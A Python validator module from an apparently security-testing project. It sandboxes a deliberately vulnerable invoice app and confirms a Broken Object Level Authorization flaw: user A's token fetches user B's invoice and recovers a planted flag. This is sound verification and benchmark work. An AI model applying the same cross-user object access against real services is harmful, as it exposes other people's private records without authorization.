"""Live exploit validator — the ground truth. No LLM here.

Spins up the target app in a sandbox, then runs the BOLA exploit as a real
HTTP exchange: user A's token fetches user B's invoice. The finding flips to
VERIFIED only if A actually receives B's object (different owner) and the
planted flag comes back. Also probes the safe endpoint to prove precision.

Two interchangeable sandboxes:
  * docker      — builds and runs the container (the headline; matches
                  `docker compose up` and HackBench's Dockerized-target format)
  * subprocess  — runs uvicorn locally (zero-dependency fallback so the demo
                  and CI never hang waiting on a daemon)
"""
from __future__ import annotations

import contextlib
import json
import os
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

import httpx

from .models import Evidence, HttpExchange

TARGET_DIR = Path(__file__).resolve().parent.parent / "target_app"
CHALLENGE = json.loads((TARGET_DIR / "challenge.json").read_text())
IMAGE = "prooftrace-target:latest"
CONTAINER = "prooftrace-target"
# A project-local docker config without a (possibly broken) credential helper,
# so anonymous Docker Hub pulls work regardless of the host's docker setup.
_CLEAN_CFG = Path(__file__).resolve().parent.parent / ".docker-clean"


def _docker_env() -> dict:
    env = dict(os.environ)
    if (_CLEAN_CFG / "config.json").exists():
        env["DOCKER_CONFIG"] = str(_CLEAN_CFG)
    return env


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    return (
        subprocess.run(
            ["docker", "info"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=_docker_env(),
        ).returncode
        == 0
    )


def _wait_healthy(base_url: str, timeout: float = 40.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        with contextlib.suppress(Exception):
            r = httpx.get(f"{base_url}/healthz", timeout=2.0)
            if r.status_code == 200:
                return True
        time.sleep(0.4)
    return False


@contextlib.contextmanager
def _docker_sandbox(port: int):
    subprocess.run(
        ["docker", "rm", "-f", CONTAINER],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=_docker_env(),
    )
    build = subprocess.run(
        ["docker", "build", "-q", "-t", IMAGE, "."],
        cwd=TARGET_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=_docker_env(),
    )
    if build.returncode != 0:
        raise RuntimeError(f"docker build failed:\n{build.stdout.decode()}")
    run = subprocess.run(
        [
            "docker", "run", "-d", "--rm",
            "--name", CONTAINER,
            "-p", f"{port}:8000",
            IMAGE,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=_docker_env(),
    )
    if run.returncode != 0:
        raise RuntimeError(f"docker run failed:\n{run.stdout.decode()}")
    try:
        yield f"http://127.0.0.1:{port}"
    finally:
        subprocess.run(
            ["docker", "rm", "-f", CONTAINER],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=_docker_env(),
        )


@contextlib.contextmanager
def _subprocess_sandbox(port: int):
    env = dict(os.environ)
    proc = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "app.main:app",
         "--host", "127.0.0.1", "--port", str(port), "--log-level", "warning"],
        cwd=TARGET_DIR,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        yield f"http://127.0.0.1:{port}"
    finally:
        proc.terminate()
        with contextlib.suppress(Exception):
            proc.wait(timeout=5)


def choose_backend(prefer: str = "auto") -> str:
    if prefer == "docker":
        return "docker"
    if prefer == "subprocess":
        return "subprocess"
    return "docker" if _docker_available() else "subprocess"


@contextlib.contextmanager
def sandbox(backend: str = "auto"):
    """Yield (base_url, resolved_backend)."""
    resolved = choose_backend(backend)
    port = _free_port()
    ctx = _docker_sandbox(port) if resolved == "docker" else _subprocess_sandbox(port)
    with ctx as base_url:
        if not _wait_healthy(base_url):
            raise RuntimeError(f"target app never became healthy at {base_url}")
        yield base_url, resolved


def _fmt_request(method: str, url: str, token: str) -> str:
    return (
        f"$ curl -H 'Authorization: Bearer {token}' {url}\n"
        if method == "GET"
        else f"$ curl -X {method} -H 'Authorization: Bearer {token}' {url}\n"
    )


def run_exploit(base_url: str) -> Evidence:
    """Execute the BOLA exploit live. Returns binary-verified Evidence."""
    tokens = CHALLENGE["tokens"]
    tok_a = tokens["user_A"]
    exchanges: list[HttpExchange] = []

    with httpx.Client(base_url=base_url, timeout=10.0) as client:
        # 1. Sanity: A reads A's own invoice (id=1).
        url1 = f"{base_url}/api/invoices/1"
        r1 = client.get("/api/invoices/1", headers={"Authorization": f"Bearer {tok_a}"})
        exchanges.append(
            HttpExchange(_fmt_request("GET", url1, tok_a), r1.status_code, r1.text)
        )

        # 2. The exploit: A reads invoice 2, which belongs to user_B.
        url2 = f"{base_url}/api/invoices/2"
        r2 = client.get("/api/invoices/2", headers={"Authorization": f"Bearer {tok_a}"})
        exchanges.append(
            HttpExchange(_fmt_request("GET", url2, tok_a), r2.status_code, r2.text)
        )

        # 3. Precision contrast: safe endpoint returns only A's own invoices.
        url3 = f"{base_url}/api/me/invoices"
        r3 = client.get("/api/me/invoices", headers={"Authorization": f"Bearer {tok_a}"})
        exchanges.append(
            HttpExchange(_fmt_request("GET", url3, tok_a), r3.status_code, r3.text)
        )

    reproduced = False
    flag = None
    assertion = ""
    if r2.status_code == 200:
        body = r2.json()
        owner = body.get("owner_id")
        if owner and owner != "user_A":
            reproduced = True
            flag = CHALLENGE["flag"] if CHALLENGE["flag"] in r2.text else body.get("note")
            assertion = (
                f"user_A authenticated, received invoice 2 owned by {owner}, "
                f"flag recovered -> BOLA confirmed"
            )
    if not reproduced:
        assertion = "user_A could not read another user's invoice -> not exploitable"

    return Evidence(
        exploit_reproduced=reproduced,
        exchanges=exchanges,
        flag=flag,
        attacker_user="user_A",
        victim_user="user_B",
        assertion=assertion,
    )


def validate(backend: str = "auto") -> tuple[Evidence, str]:
    """Full validation: sandbox up -> exploit -> Evidence. Returns (ev, backend)."""
    with sandbox(backend) as (base_url, resolved):
        ev = run_exploit(base_url)
    return ev, resolved
